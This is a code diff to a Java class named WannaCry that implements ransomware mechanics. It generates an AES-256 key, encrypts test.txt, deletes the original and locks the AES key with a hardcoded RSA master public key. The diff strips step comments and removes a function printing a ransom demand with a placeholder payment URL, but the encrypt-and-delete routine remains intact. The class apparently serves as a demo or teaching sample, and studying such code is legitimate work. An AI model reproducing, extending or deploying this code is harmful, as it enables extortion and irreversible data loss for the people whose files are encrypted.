@@ -25,28 +25,25 @@ public class WannaCry {
     
     public static void main(String[] args) throws Exception {
         try {
-            // Step 1: Generate a fresh 256-bit AES key
+            // Generate a fresh 256-bit AES key
             KeyGenerator keyGen = KeyGenerator.getInstance("AES");
             keyGen.init(256);
             SecretKey aesKey = keyGen.generateKey();
             
-            // Step 2: Encrypt test.txt with AES-256-CBC
+            // Encrypt test.txt with AES-256-CBC
             encryptFile("test.txt", "test.txt.cry", aesKey);
             
-            // Step 3: Delete original test.txt
+            // Delete original test.txt
             Files.delete(Paths.get("test.txt"));
             
-            // Step 4: Encrypt AES key with master RSA public key
+            // Encrypt AES key with master RSA public key
             PublicKey masterPublicKey = decodePublicKey(MASTER_PUBLIC_KEY);
             byte[] encryptedAesKey = encryptAesKey(aesKey.getEncoded(), masterPublicKey);
             
-            // Step 5: Save encrypted AES key to aes.key
+            // Save encrypted AES key to aes.key
             try (FileOutputStream fos = new FileOutputStream("aes.key")) {
                 fos.write(encryptedAesKey);
             }
-            
-            // Step 6: Display ransom message
-            displayRansomMessage();
             
         } catch (Exception e) {
             System.err.println("Error: " + e.getMessage());
@@ -96,17 +93,5 @@ public class WannaCry {
         X509EncodedKeySpec keySpec = new X509EncodedKeySpec(decodedKey);
         KeyFactory keyFactory = KeyFactory.getInstance("RSA");
         return keyFactory.generatePublic(keySpec);
-    }
-    
-    /**
-     * Display ransom message
-     */
-    private static void displayRansomMessage() {
-        System.out.println();
-        System.out.println("Dear User! Please note that your files have now been encrypted.");
-        System.out.println("To recover your files we ask you to follow the instructions");
-        System.out.println("in the website below to arrange a small payment:");
-        System.out.println("https://example-ransomware-payment.com");
-        System.out.println();
     }
 }
